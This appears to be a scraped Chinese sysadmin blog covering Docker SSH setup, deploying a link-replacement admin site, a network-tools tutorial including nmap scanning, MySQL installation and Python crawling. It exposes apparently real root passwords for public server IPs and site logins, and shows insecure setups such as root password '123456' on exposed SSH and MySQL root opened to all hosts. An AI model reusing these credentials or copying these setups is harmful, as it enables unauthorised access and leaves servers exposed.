在命令行中执行如下命令： # localedef -i zh_CN -f UTF-8 zh_CN.UTF-8 # yum -y install kde-l10n-Chinese &amp;&amp; yum -y reinstall glibc-common # localedef -c -f UTF-8 -i zh_CN zh_CN.utf8 # export LC_ALL=zh_CN.utf8第二种需要修改生成镜像的配置文件： ​ 在Dockerfile中添加一行，如下所示： ​ ENV LANG C.UTF-8 ​ 重新打包制作docker镜像，重新进入容器后发现问题解决！ 方法三1234567891011121314151617181920212223242526271.启动容器docker run -itd --name centos7_6 --privileged --restart=always -p 2222:22 centos /usr/sbin/init进入容器docker exec -it centos7_6 /bin/bash2.安装sshdyum install -y openssh-server openssh-clientssystemctl enable sshdsystemctl start sshdmkdir /var/run/sshd3.修改sshd_config配置文件 dns打开echo 'UseDNS no' &gt;&gt; /etc/ssh/sshd_configsed -i -e '/pam_loginuid.so/d' /etc/pam.d/sshd echo 'root:123456' |chpasswd/usr/bin/ssh-keygen -A现在可以通过xshell 2222端口连接了。4.或者可以创建新镜像。以后可以用。docker commit -m=&quot;支持sshd&quot; -a=&quot;luke&quot; centos7_6 centosxin运行新的docker run -itd --name centosxin1 --privileged --restart=always -p 3333:22 centosxin /usr/sbin/sshd -D","link":"/2020/08/04/%E5%88%9B%E5%BB%BAcentos%E9%95%9C%E5%83%8F%E6%94%AF%E6%8C%81ssh/"},{"title":"部署站点链接更换后台","text":"部署站点链接更换后台1、先部署好docker 12345678910111213141516171819202122232425262728293031323334353637383940#!/bin/bash# jiankong可能需要安装模块 cryptographydocker network create --driver bridge --subnet 172.22.0.1/16 n3# 安装数据库docker run -dit --name mysql8.0 -p3306:3306 --network=n3 --ip=172.22.0.2 --restart always -e MYSQL_ROOT_PASSWORD=Pwd@123456 library/mysqldocker exec -it mysql8.0 bashmysql -uroot -pPwd@123456create database python01;create user root identified by 'Pwd@123456'; #这步不用grant all privileges on python01.* to 'root'@'%';# 1,在服务器上使用docker安装网站docker run -dit --name jiankong -e &quot;port=8888&quot; -p8888:8888 --network=n3 --ip=172.22.0.3 --restart always xiaoxuenice/jiankong# 2，进入docker更改mysql数据库&lt;br&gt;[root@a mnt]# docker exec -it jiankong bashroot@ceff2a3d8c26:/# pip install cryptographyroot@ceff2a3d8c26:/# cat demo/settings.py 'ENGINE': 'django.db.backends.mysql', 'NAME': 'python01', 'USER': 'root', 'PASSWORD':'Pwd@123456', 'HOST':'172.22.0.2', 'PORT':'3306',root@ceff2a3d8c26:/# exit可以复制出来修改。然后在cp回容器里面 复制容器里面/demo/settings.py 的文件 docker cp jiankong:/demo/settings.py /root/ [root@a mnt]# docker restart jiankong#初始化项目[root@a mnt]# docker exec -it jiankong bashroot@ceff2a3d8c26:/# python3 manage.py makemigrationsroot@ceff2a3d8c26:/# python3 manage.py migrateroot@ceff2a3d8c26:/# python3 manage.py createsuperuser 后台用户名密码设置为 admin# 3,http://192.168.1.200:8888/admin/ 登陆网站 设置域名绑定登录1234567891011121314151617181920212223242526272829 配置nginx server { listen 80; listen 9999 ssl; server_name vip.yunwei.com; charset utf-8; ssl_certificate /software/域名证书/vip.yunwei.com/Nginx/vip.yunwei.com.nginx.crt; ssl_certificate_key /software/域名证书/vip.yunwei.com/Nginx/vip.yunwei.com.key; # ssl_protocols TLSv1 TLSv1.1 TLSv1.2; # ssl_prefer_server_ciphers on; if ($server_port = 80 ){ rewrite ^/(.*) https://$host:9999$1 break; } location / { proxy_pass http://localhost:8888; proxy_set_header Host $host; } fastcgi_intercept_errors on;} 开始登录后台 1234567891011121314151617181920212223242526272829303132333435363738https://vip.yunwei.com:9999/admin/用户名: root密码: admin1.首先新增需要连接的master服务器修改 master服务器历史IP地址:13.15.5.10端口:22密码:pSwd@LINUX##!!用户:root站点名字:88-masterHtml目录:/usr/share/nginx/html/Tb推送命令:/bin/sh /xue/back_nginx1.sh继续新增IP地址:47.24.2.17端口:2222密码:wuji..!@djjkdj.$#@!abc用户:root站点名字:99-1-masterHtml目录:/software/Tb推送命令:/usr/bin/ansible -m shell -a &quot;bash /software/1手动同步.sh&quot; China 2、新增站点。 1361服装 3、新增作者信息用于登录管理服务器。做相应的授权。 12345678910111213141516171819名字:yunwei666@qq.comQq:yunwei666地址:G/F Main Mall, SM Central Business Park, Seaside Blvd, 123, Pasay, 1300 Metro Manila, 菲律宾邮箱:yunwei666@qq.com名字:caomeiQq:caomei666然后认证和授权里面添加后台登录的用户和密码后台用户：yunwei666密码: yunWeiSSS!! 4、前台登录 123https://vip.yunwei.com:9999/用户：yunwei666@qq.com密码: yunwei666 5、可以登录前台选择导航。连接对应的服务器进行替换工作上日常更换的链接。 部署好后显示的页面如下: 主要的功能是sed替换，防止工作中经常替换导致不小心出错。 安装简单的监控12345678910111213141516171819202122232425262728293031323334353637# 1,被监控主机下载脚本&lt;br&gt;wget https://raw.githubusercontent.com/xiaoxuenice/jiankong/master/client.py第三行写自己的IP地址 host='192.168.1.100' 第27行为服务器IP地址 http://192.168.1.200:8888/recive?# 2，写开机启动脚本，python3自己安装，pip安装好requests 和 psutilcat &gt;&gt; /etc/init.d/jiankong &lt;&lt; EOF#!/bin/bash# chkconfig: 345 85 15python3=/usr/local/python/bin/python3case $1 instart)nohup $python3 /mnt/client.py &amp;;;reload)for i in `ps -ef |grep client.py|awk '{print $2}'`;do kill -9 $i;donenohup $python3 /mnt/client.py &amp;;;stop)for i in `ps -ef |grep client|awk '{print $2}'`;do kill -9 $i;done;;restart)for i in `ps -ef |grep client.py|awk '{print $2}'`;do kill -9 $i;donenohup $python3 /mnt/client.py &amp;;;*)echo &quot;what do you want to do?&quot;;;esacEOFchmod +x /etc/init.d/jiankongchkconfig --add jiankongchkconfig jiankong on# 3，每分钟上传一次数据到监控服务器http://192.168.1.200:8888/jiankong 查看数据# 4，/目录是login后台里面创建用户，邮箱是账号，qq是密码","link":"/2022/04/10/%E5%9F%9F%E5%90%8D%E7%AB%99%E7%82%B9%E9%93%BE%E6%8E%A5%E6%9B%B4%E6%8D%A2%E5%8F%AF%E8%A7%86%E5%8C%96%E9%83%A8%E7%BD%B2/"},{"title":"常见网络工具的使用","text":"常见网络工具的使用网络检测工具1. ping工具ping 用于确定本地主机是否能与另一台主机成功交换(发送与接收)数据包，再根据返回的信息，就可以推断TCP/IP参数是否设置正确，以及运行是否正常、网络是否通畅等。Ping命令主要作用为 （1）用来检测网络的连通情况和分析网络速度； （2）根据域名得到服务器IP； （3）根据ping返回的TTL值来判断对方所使用的操作系统及数据包经过路由器数量。 linux安装(默认就有) 1yum install -y iputils 使用方式 12345678910111213141516ping -v 查看其它参数命令。ping baidu.com 64 bytes from 39.156.69.79 (39.156.69.79): icmp_seq=1 ttl=128 time=160 msbytes: 表示数据包大小，也就是字节。数据包不能太大。要不然服务器会认为是工具。icmp_seq: 表示发到对方的第几个包。ttl: Time To LIve,表示DNS记录在dns服务器上存在的时间，它是IP协议包的一个值，告诉路由器该数据包何时需要被丢弃。可以通过Ping返回的TTL值大小，粗略地判断目标系统类型是Windows系列还是UNIX/Linux系列。默认情况下，Linux系统的TTL值为64或255，WindowsNT/2000/XP系统的TTL值为128，Windows98系统的TTL值为32，UNIX主机的TTL值为255。因此一般TTL值：100~130ms之间，Windows系统 ；240~255ms之间，UNIX/Linux系统。time: 响应时间，这个时间越小，说明连这个地址的速度越快。ping + ip： 查看某一个ip地址是否能够连通，如： ping 114.80.67.168 2. tcping 工具官网下载 12去官网下载tcping工具（根据自身系统选择32位/64位）https://elifulkerson.com/projects/tcping.php linux安装 1yum istall -y tcping 用法： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108名称 tcping-通过建立与网络主机的连接，在tcp上模拟“ ping”。 测量系统达到[SYN]，接收目标的[SYN] [ACK]和发送[ACK]的时间。请注意， 不包括最后一个ACK的传输时间-仅包含发送到发送端的时间。提要 tcping [-tdsvf46] [-i间隔] [-n次] [-w间隔] [-bn] [-r次] [-j深度] [--tee文件名] [-f]目标[端口] 描述 tcping测量在其自身与远程主机之间执行TCP 3向握手（SYN，SYN / ACK，ACK）所需的时间。 不包括传出最终ACK的传输时间，仅包括将其丢弃所需的（最短）时间 电线在近端。这允许（SYN，SYN / ACK）的传播时间近似 等于ICMP（请求，响应）的传播时间。 选项 -4优选使用IPv4 -6 优选 连续使用IPv6 -t ping，直到通过control-c -n count 发送_count_ pings停止，然后停止。缺省 值为4。 -i interval在两次ping之间等待_interval_秒。默认值1.允许使用小数。 -w interval 等待_interval_秒以获取响应。默认值2。允许使用小数。 -d在每个输出行上包括日期和时间 -f除了建立连接外，还强制发送至少一个字节。 -g count 在_count_次ping失败后放弃。 -b类型 启用蜂鸣声。 “ -b 1”将“向下”发出哔声。如果主机启动了，但现在没有启动，则发出哔声。 “ -b 2”将“向上”发出哔声。如果主机掉线了，但现在却掉线了，请发出哔声。 “ -b 3”将在“更改”时发出蜂鸣声。如果主机是一种方式，但现在是另一种方式，则发出哔声。 “ -b 4”将“总是”发出哔声。 -c仅在更改后的状态下显示输出 -r count 每次计数时，如果主机更改，我们将为主机执行新的DNS查找。 -s成功后立即退出。 -v打印版本并退出。 -j计算抖动。抖动定义为上次响应时间与历史平均值之间的差。 -js depth 与-j一样，但指定了可选的_depth_参数，计算抖动。如果指定了_depth_，则tcping将 使用先前的_depth_值来计算滚动平均值。 --tee _filename_ 复制输出到指定的_filename_。Windows仍不能依赖于具有有用的命令行 环境。* nix伙计们，不要嘲笑我。 - 附加 使用--tee时，请追加而不是覆盖输出文件。 --file 将“目标”选项视为文件名。该文件成为目标源， 逐行循环。某些选项在此模式下不起作用，并且不会保留统计信息。 目标 DNS名称，IP地址或（在“ http”模式下）URL。 不要在“ http”模式下指定协议（“ http：//”）。也不要通过“：port”语法指定服务器端口。 例如：“ tcping http://www.elifulkerson.com:8080/index.html”将失败 使用样式：“ tcping www.elifulkerson.com/index.html 8080” 代替。 港口 一个数字TCP端口1-65535。如果未指定，则默认为80 。--header 包含带有命令行参数和时间戳的标头。如果使用--tee，则暗含标题。 HTTP模式选项 -h使用“ http”模式。在http模式下，我们将尝试获取指定的文档并返回其他值，包括 文档的大小，http响应代码，kbit / s。 -u在“ http”模式下，在每个输出行上包括目标URL。 --post在http模式下使用POST而不是GET。 --head在http模式下使用HEAD而不是GET。 --get简写为一致性起见调用“ http”模式。 --proxy-server _proxyserver_ 连接到_proxyserver_以请求URL，而不是URL本身指示的服务器。 --proxy-port _port_ 指定代理服务器的数字TCP端口。默认值为 3128。--proxy-credentials username：password 指定作为“ Proxy-Authorization：Basic”标头发送的username：password对。返回值 如果所有ping成功，则tcping返回0；如果ping零成功，则返回1；对于混合结果，返回2。 错误/要求请通过http://www.elifulkerson.com上的联系信息向作者报告错误和功能要求 可用性 tcping可在http://www.elifulkerson.com/projects/tcping.php上获得 示例： 1tcping server2.com 80 #测试80端口是否打开。 3. telnet 工具Telnet是进行远程登录的标准协议和主要方式它为用户提供了在本地计算机上完成远程主机工作的能力。可以用telnet命令来测试端口号是否正常打开还是关闭状态。 安装 1yum install xinetd telnet telnet-server -y 输入telnet测试端口命令： telnet IP 端口 或者 telnet 域名–端口–回车 4. nmap 工具Nmap即网络映射器对Linux系统/网络管理员来说是一个开源且非常通用的工具。Nmap用于在远程机器上探测网络，执行安全扫描，网络审计和搜寻开放端口。它会扫描远程在线主机，该主机的操作系统，包过滤器和开放的端口。 安装 1yum install -y nmap 1. 用主机名和IP地址扫描系统 扫描特定的端口 1nmap -p 80 server2.com 扫描系统找出该系统上所有开放的端口，服务和MAC地址 123nmap server2.com或者nmap 192.168.224.12 2. 扫描使用-v 选项 使用“ -v “选项后给出了远程机器更详细的信息。 1nmap -v server2.com 3.扫描多台主机 1nmap 192.168.224.12 baidu.com 4.扫描整个子网 使用*通配符来扫描整个子网或某个范围的IP地址。 1nmap 192.168.0.* 5.使用ip地址的最后一个字节扫描多台服务器 1nmap 192.168.224.11,12,10 6.从一个文件中扫描主机列表 12345cat nmptest.txtlocalhot server2.combaidu.com192.168.224.12 接下来运行带“iL” 选项的nmap命令来扫描文件中列出的所有IP地址 1nmap -iL nmaptest.txt 7.扫描一个IP地址范围 1nmap 192.168.224.101-110 8.排除一些远程主机后再扫描 在执行全网扫描或用通配符扫描时你可以使用“-exclude”选项来排除某些你不想要扫描的主机。 1nmap 192.168.224.* --exclude 192.168.224.100 9.扫描操作系统信息和路由跟踪 检测远程主机上运行的操作系统和版本。为了启用操作系统和版本检测，脚本扫描和路由跟踪功能，我们可以使用NMAP的“**-A**“选项。 1nmap -A 192.168.224.12 会显示出远程主机操作系统的TCP / IP协议指纹，并且更加具体的显示出远程主机上的端口和服务。 12310.启用Nmap的操作系统探测功能使用选项“-O”和“-osscan-guess”也帮助探测操作系统信息。nmap -O server2.com 13.找出网络中的在线主机 使用“**-sP**”选项，我们可以简单的检测网络中有哪些在线主机，该选项会跳过端口扫描和其他一些检测。 1nmap -sP 192.168.0.* DNS域名解析工具1. dig工具dig 是不错的排查域名解析错误的工具 linux安装 1yum install -y bind-utils 使用方式 123dig baidu.com或者 dig @114.114.114.114 baidu.com #指定114的域名DNS 2. nslookup 工具下载和dig一样 1yum install -y bind-utils 使用方式 1234567891011121314nslookup [-qt=类型] 目标域名 指定的DNS服务器IP或域名nslookup baidu.com或者nslookup baidu.com 8.8.4.4 #指定谷歌的域名DNS加参数的方式好像linux下面不行，只能windows上面才可以。前面两个命令没有加任何参数，所以默认情况下nslookup查询的是A类型的记录。如果我们配置了其他类型的记录希望看到解析是否正常。这时候ping就无能为力了。比如我们配置了MX记录，但是邮件服务器只能发信不能收信，到底是域名解析问题还是其他的问题Ping命令的检查只能让你误入歧途。nslookup 这时候可以模拟你的其他遇见服务器进行域名解析的情况。我们需要在nslookup上加上适当的参数。指定查询记录类型的指令格式如下：nslookup –qt=类型 目标域名 注意qt必须小写。 类型可以是一下字符，不区分大小写： A 地址记录(Ipv4) AAAA 地址记录（Ipv6） AFSDB Andrew文件系统数据库服务器记录（不懂） ATMA ATM地址记录（不是自动提款机） CNAME 别名记录 HINFO 硬件配置记录，包括CPU、操作系统信息 ISDN 域名对应的ISDN号码 MB 存放指定邮箱的服务器 MG 邮件组记录 MINFO 邮件组和邮箱的信息记录 MR 改名的邮箱记录 MX 邮件服务器记录 NS 名字服务器记录 PTR 反向记录（从IP地址解释域名） RP 负责人记录 RT 路由穿透记录（不懂） SRV TCP服务器信息记录（将有大用处） TXT 域名对应的文本信息 X25 域名对应的X.25地址记录 看看baidu.com的邮件服务器记录吧。 1nslookup -qt=mx baidu.com 看看，nslookup把服务器的名称和地址都给出来了，注意preference就是前面所说的优先级，该数值越小则优先级越高。 我再看看名字服务器记录是怎么样的。 看起来和MX记录的格式差不多，一般情况下服务器会同时返回对应的地址。不过也有不返回的情况。 在这里我希望大家注意一行显示“Non-suthoritativeanswer(非权威应答):”，这一行在前面的例子中都没有显示过。它的出现代表这个结果是从服务器的缓存中得到的。所以提醒你这不是一个授权的答案。 检查域名的缓存时间 检查域名的缓存时间需要我们使用一个新的参数：-d 格式如下： nslookup –d [其他的参数] 目标域名 [指定的服务器地址] 1nslookup -d4 baidu.com 8.8.4.4 3. host工具host命令是常用的分析域名查询工具，可以用来测试域名系统工作是否正常。 语法 1234host 选项 参数参数: 主机：指定要查询信息的主机信息。 选项 选项 描述 -a 显示详细的DNS信息； -c&lt;类型&gt; 指定查询类型，默认值为“IN“；CHAOS HESIOD ANY *通配符 -C 查询指定主机的完整的SOA记录； -r 在查询域名时，不使用递归的查询方式； -t&lt;类型&gt; 指定查询的域名信息类型；分别有A CNAME HINFO KEY MINFO MX NS PTR SIG SOA TXT UIFO WKS -v 显示指令执行的详细信息； -w 如果域名服务器没有给出应答信息，则总是等待，直到域名服务器给出应答； -W&lt;时间&gt; 指定域名查询的最长时间，如果在指定时间内域名服务器没有给出应答信息，则退出指令； -4 使用IPv4； -6 使用IPv6; 示例: 要显示主机名为 baidu.com 的主机地址，请输入： 123host baidu.com详细信息host -a baidu.com 要显示域名baidu.com的详细的mx记录: 1host -a -t mx baidu.com 路由跟踪查询工具1. tracert 工具(windows)Tracert（跟踪路由）是路由跟踪实用程序，用于确定 IP数据包访问目标所采取的路径。 tracert命令通常用来检测故障点的位置。 Tracert 命令使用用 IP 生存时间 (TTL) 字段和 ICMP 错误消息来确定从一个主机到网络上其他主机的路由.其命令格式如下: 1tracert [-d] [-h maximum_hops] [-j computer-list] [-w timeout] target_name 参数说明 -d 指定不将地址解析为计算机名. -h maximum_hops 指定搜索目标的最大跃点数. -j host-list 与主机列表一起的松散源路由（仅适用于IPv4），指定沿host-list的稀疏源路由列表序进行转发。host-list是以空格隔开的多个路由器IP地址，最多9个。 -w timeout 等待每个回复的超时时间(以毫秒为单位). -R 跟踪往返行程路径(仅适用于 IPv6). -S srcaddr 要使用的源地址(仅适用于 IPv6). -4 强制使用 IPv4. -6 强制使用 IPv6. 示例： 1tracert baidu.com tracert –d 目标ip地址，加-d参数，该命令就不解析主机名了，再返回结果中就没有主机名的信息了。 1tracert -d 192.168.224.2 tracert –h 跳数 目标ip地址，目标地址的跳数大于指定的跳数只显示指定跳数信息。 1tracert -h 6 baidu.com //相当于最多跟踪6次路由到达目标地址。 2. traceroute (linux)通过traceroute我们可以知道信息从你的计算机到互联网另一端的主机是走的什么路径。当然每次数据包由某一同样的出发点（source）到达某一同样的目的地(destination)走的路径可能会不一样，但基本上来说大部分时候所走的路由是相同的。linux系统中，我们称之为traceroute,在MS Windows中为tracert。 traceroute通过发送小的数据包到目的设备直到其返回，来测量其需要多长时间。一条路径上的每个设备traceroute要测3次。输出结果中包括每次测试的时间(ms)和设备的名称（如有的话）及其IP地址。 安装 123yum install -y traceroutetraceroute --help #查看命令使用信息 在大多数情况下，我们会在linux主机系统下，直接执行命令行： 1traceroute 主机名/域名 命令参数 12345traceroute[参数][主机]traceroute指令让你追踪网络数据包的路由途径，预设数据包大小是40Bytes，用户可另行设置。具体参数格式：traceroute [-dFlnrvx][-f&lt;存活数值&gt;][-g&lt;网关&gt;...][-i&lt;网络界面&gt;][-m&lt;存活数值&gt;][-p&lt;通信端口&gt;][-s&lt;来源地址&gt;][-t&lt;服务类型&gt;][-w&lt;超时秒数&gt;][主机名称或IP地址][数据包大小] 3.命令参数： -d 使用Socket层级的排错功能。 -f 设置第一个检测数据包的存活数值TTL的大小。 -F 设置勿离断位。 -g 设置来源路由网关，最多可设置8个。 -i 使用指定的网络界面送出数据包。 -I 使用ICMP回应取代UDP资料信息。 -m 设置检测数据包的最大存活数值TTL的大小。 -n 直接使用IP地址而非主机名称。 -p 设置UDP传输协议的通信端口。 -r 忽略普通的Routing Table，直接将数据包送到远端主机上。 -s 设置本地主机送出数据包的IP地址。 -t 设置检测数据包的TOS数值。 -v 详细显示指令的执行过程。 -w 设置等待远端主机回报的时间。 -x 开启或关闭数据包的正确性检验。 4.使用实例： 实例1：traceroute 用法简单、最常用的用法 1traceroute baidu.com 说明： 记录按序列号从1开始，每个纪录就是一跳 ，每跳表示一个网关，我们看到每行有三个时间，单位是 ms，其实就是-q的默认参数。探测数据包向每个网关发送三个数据包后，网关响应后返回的时间；如果您用 traceroute -q 4 baidu.com ，表示向每个网关发送4个数据包。 有时我们traceroute(路由跟踪) 一台主机时，会看到有一些行是 以*\\ 星号**表示的。出现这样的情况，可能是防火墙封掉了ICMP的返回信息，所以我们得不到什么相关的数据包返回数据。 有时我们在某一网关处延时比较长，有可能是某台网关比较阻塞，也可能是物理设备本身的原因。当然如果某台DNS出现问题时，不能解析主机名、域名时，也会 有延时长的现象；您可以加-n 参数来避免DNS解析，以IP格式输出数据。 如果在局域网中的不同网段之间，我们可以通过traceroute 来排查问题所在，是主机的问题还是网关的问题。如果我们通过远程来访问某台服务器遇到问题时，我们用到traceroute 追踪数据包所经过的网关，提交IDC服务商，也有助于解决问题；但目前看来在国内解决这样的问题是比较困难的，就是我们发现问题所在，IDC服务商也不可能帮助我们解决。 实例2：跳数设置 命令： 1traceroute -m 10 www.baidu.com 输出：10行。 抓包工具linux下 1. tcpdump安装 1yum install -y tcpdump 1.作用： （1）捕获网络协议包 （2）分析网络协议包 2.分类： （1）命令行工具，如tcpdump （2）图像界面工具，wireshark 3.tcpdump命令行工具的使用 3.1格式：tcpdump [ -DenNqvX ] [ -c count ] [ -F file ] [ -i interface ] [ -r file ] [ -s snaplen ] [ -w file ] [ expression ] 3.2选项分类 抓包选项 -c：指定要抓取的包数量 -i interface：指定tcpdump需要监听的接口，-I 后面直接跟网卡名即可，如-I ens33 -n：对地址以数字方式显式，否则显式为主机名 -nn：除了-n的作用外，还把端口显示为数值 输出选项 -e：输出的每行中都将包括数据链路层头部信息，例如源MAC和目标MAC。 -q：快速打印输出。即打印很少的协议相关信息，从而输出行都比较简短。 -X：输出包的头部数据，会以16进制和ASCII两种方式同时输出。 -XX：输出包的头部数据，会以16进制和ASCII两种方式同时输出，更详细。 -v：当分析和打印的时候，产生详细的输出。 -vv：产生比-v更详细的输出。 -vvv：产生比-vv更详细的输出 其他功能选项 -D：列出可用于抓包的接口 -F：从文件中读取抓包的表达式 -w：将抓包数据输出到文件中而不是标准输出，如-w node1.cap -r：从给定的数据包文件中读取数据。如tcmdump -r node1.cap 4.tcpdump的表达式 tcpdump的表达式由一个或多个”单元”组成，每个单元一般包含ID的修饰符和一个ID(数字或名称)。有三种修饰符： type：指定ID的类型。 可以给定的值有host/net/port/portrange。例如”host foo”，”net 128.3”，”port 20”，”portrange 6000-6008”。默认的type为host。 dir：指定ID的方向。 可以给定的值包括src/dst/src or dst/src and dst，默认为src or dst。例如，”src foo”表示源主机为foo的数据包，”dst net 128.3”表示目标网络为128.3的数据包，”src or dst port 22”表示源或目的端口为22的数据包。 proto：通过给定协议限定匹配的数据包类型。 常用的协议有tcp/udp/arp/ip/ether/icmp等，若未给定协议类型，则匹配所有可能的类型。例如”tcp port 21”，”udp portrange 7000-7009”。 所以，一个基本的表达式单元格式为”proto dir type ID” tcpdump [**选项] [not] proto dir type 注意顺序不能改变** 除了使用修饰符和ID组成的表达式单元，还有关键字表达式单元：gateway，broadcast，less，greater以及算术表达式。 表达式单元之间可以使用操作符” and / &amp;&amp; / or / || / not / ! “进行连接，从而组成复杂的条件表达式。如”host foo and not port ftp and not port ftp-data”，这表示筛选的数据包要满足”主机为foo且端口不是ftp(端口21)和ftp-data(端口20)的包”，常用端口和名字的对应关系可在linux系统中的/etc/service文件中找到。 另外，同样的修饰符可省略，如”tcp dst port ftp or ftp-data or domain”与”tcp dst port ftp or tcp dst port ftp-data or tcp dst port domain”意义相同，都表示包的协议为tcp且目的端口为ftp或ftp-data或domain(端口53)。 使用括号”()”可以改变表达式的优先级，但需要注意的是括号会被shell解释，所以应该使用反斜线”&quot;转义为”()”，在需要的时候，还需要包围在引号中。 5.tcpdump使用案例 5.1抓取离开或进入主机的数据包 1tcpdump -i ens33 -nn host server2.com 显示TCP包信息 1tcpdump 显示指定数量包 1tcpdump -c 20 精简显示 1tcpdump -c 10 -q //精简模式显示 10个包 对ens33网卡的ping 进行抓包。 1tcpdump -n icmp -i eth0 这时候用别的服务器来ping这台服务器，就可以抓到包了。","link":"/2020/08/03/%E5%B8%B8%E8%A7%81%E7%BD%91%E7%BB%9C%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/"},{"title":"安装mysql5.7","text":"安装mysql5.7安装mysql源 1rpm -Uvh http://dev.mysql.com/get/mysql57-community-release-el7-9.noarch.rpm 安装mysql 1yum -y install mysql-community-server 启动 12systemctl start mysqldsystemctl enable mysqld 查看日志，看临时密码 1grep 'temporary password' /var/log/mysql.log 登录后修改 12345alter user user() identified by &quot;123.Shui!!$#&quot;;flush privileges; 或者alter user 'root'@'localhost' identified by '123.Shui!!$#'; 设置 root 远程访问，5.6之前可以直接通过修改表生效，5.7之后就不可以了 12use mysql ;update mysql.user set host=&quot;%&quot; where user=&quot;root&quot;; 设置5.7 root 远程访问 123grant all privileges on *.* to 'root'@'%' identified by '123.Shui!!$#' with grant option;flush privileges #需要执行这个语句，要不然就要重启，8.0的mysql不用执行这句。 注意 SET PASSWORD ... = PASSWORD('*auth_string*') 自MySQL 5.7.6起不赞成使用该语法，并且在将来的MySQL版本中将删除该语法。 SET PASSWORD ... = '*auth_string*' 语法不被弃用，而是ALTER USER用于帐户更改（包括分配密码）的首选语句。例如： 1ALTER USER user() IDENTIFIED BY 'auth_string'; 官网 1https://dev.mysql.com/doc/refman/5.7/en/grant.html 创建用户远程访问12345create user 'test1' identified by '123.Yichen!!'; #密码不能太简单，8.0是可以简单这是可以远程登录，但是没有权限。GRANT ALL ON *.* TO 'test1'@'%'; 这时候就可以了。 后期更换密码 123alter user 'root'@'%' indentified by '123.Shui!!$#@';注意这里不用使用user()函数，使用user()会是'root'@'localhost' 会报错，因为表里已经没有这个主机了。 忘记密码修改1234vim /etc/my.cnf (在[mysqld]参数组下添加)skip-grant-tables #跳过授权表重启mysql 登录 把user变里的authentication_string字段的内容清空。 123mysql -u root update mysql.user set authentication_string='' where user='root' and host='%'; 然后退出 退出，把Skip-grant-table语句删除，重新启动数据库 在重置密码 1alter user'root'@'%' IDENTIFIED BY '123.Shui!!#@';","link":"/2020/08/03/%E5%AE%89%E8%A3%85mysql5.7/"},{"title":"搭建旁路由","text":"嗨，请准确无误地输入密码查看哟！ ","link":"/2023/11/01/%E6%90%AD%E5%BB%BA%E6%97%81%E8%B7%AF%E7%94%B1/"},{"title":"python3爬虫","text":"1,urllib爬取网页和写入文件 123456789101112131415161718192021222324252627282930313233343536373839import urllib.request#encoding=&quot;utf-8&quot;# 向指定的url地址发起请求，并返回服务器响应的数据(文件的对象)response = urllib.request.urlopen(&quot;http://www.baidu.com&quot;) # 获取数据， decode(&quot;utf-8&quot;) 表示转为字符串utf-8编码#data =response.read().decode(&quot;utf-8&quot;)#读取文件的全部内容#data =response.read()#print(data)#print(type(data))#将爬取到的网页写入文件，会把读取到的数据赋值给一个字符串变量#with open(r&quot;D:\\py_work\\grep\\爬虫\\file\\file1.html&quot; ,&quot;wb&quot;) as f:# f.write(data)#response 属性#返回当前环境的有关信息print(response.info())'''#返回状态码print(response.getcode())if response.getcode() == 200 or response.getcode() == 304: #处理网页信息 pass'''#返回当前正在爬取的url地址print(response.geturl())url = &quot;https://www.baidu.com/s?wd=%E9%95%BF%E5%9F%8E&amp;rsv_spt=1&amp;rsv_iqid=0xe262cf6300014620&amp;issp=1&amp;f=8&amp;rsv_bp=1&amp;rsv_idx=2&amp;ie=utf-8&amp;tn=baiduhome_pg&amp;rsv_enter=1&amp;rsv_dl=tb&amp;rsv_sug2=0&amp;rsv_btype=i&amp;inputT=4262&amp;rsv_sug4=6162&quot;#读取一行#data = response.readline()#读取文件的全部内容，会把读取的数据赋值给一个列表变量data =response.readlines()print(data)print(type(data))print(len(data))print(type(data[100].decode(&quot;utf-8&quot;))) 2, 模拟浏览器12345678910111213141516171819202122232425262728293031323334353637383940414243444546import urllib.requestimport randomurl = &quot;http://www.baidu.com&quot;'''#模拟请求头header ={ &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Linux; Android 8.0; Pixel 2 Build/OPD3.170816.012) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36&quot;,}#完整的heaterheader ={ &quot;Accept&quot;:&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;, &quot;X-Requested-With&quot;: &quot;XMLHttpRequest&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Linux; Android 8.0; Pixel 2 Build/OPD3.170816.012) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36&quot;, &quot;Content-Type&quot;: &quot;text/html;charset=utf-8&quot;}#设置一个请求体req = urllib.request.Request(url,headers=header)#发起请求response = urllib.request.urlopen(req)data= response.read().decode(&quot;utf-8&quot;)print(data)'''#user-agent大全agentsList = [ &quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.835.163 Safari/535.1&quot;, &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36&quot;, &quot;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; SE 2.X MetaSr 1.0; SE 2.X MetaSr 1.0; .NET CLR 2.0.50727; SE 2.X MetaSr 1.0)&quot;, &quot;User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; TencentTraveler 4.0)&quot;,]#随机拿出user-agentagentStr = random.choice(agentsList)req =urllib.request.Request(url)#向请求体添加了User-Agentreq.add_header(&quot;User-Agent&quot;,agentStr)response =urllib.request.urlopen(req)data = response.read().decode(&quot;utf-8&quot;)print(data) 3,设置超时12345678910111213import urllib.request#如果网页长时间未响应，系统判断超时，无法爬取for i in range(1,100): try: response = urllib.request.urlopen(&quot;http://www.baidu.com&quot;, timeout=0.5) print(len(response.read().decode(&quot;utf-8&quot;))) except: print(&quot;请求超时，继续下一个爬取&quot;) break 4,http请求12345678910111213'''使用场景: 进行客户端与服务端之间的消息传递时使用GET: 通过URL网址传递信息，可以直接在URL网址上添加要传递的信息POST: 可以向服务器提交数据，是一种比较流行的比较安全的数据传递方式PUT: 请求服务器存储一个资源，通常要指定存储的位置DELETE: 请求服务器删除一个资源HEAD: 请求获取对应的http报头信息OPTIONS: 可以获取当前URL所支持的请求类型''' 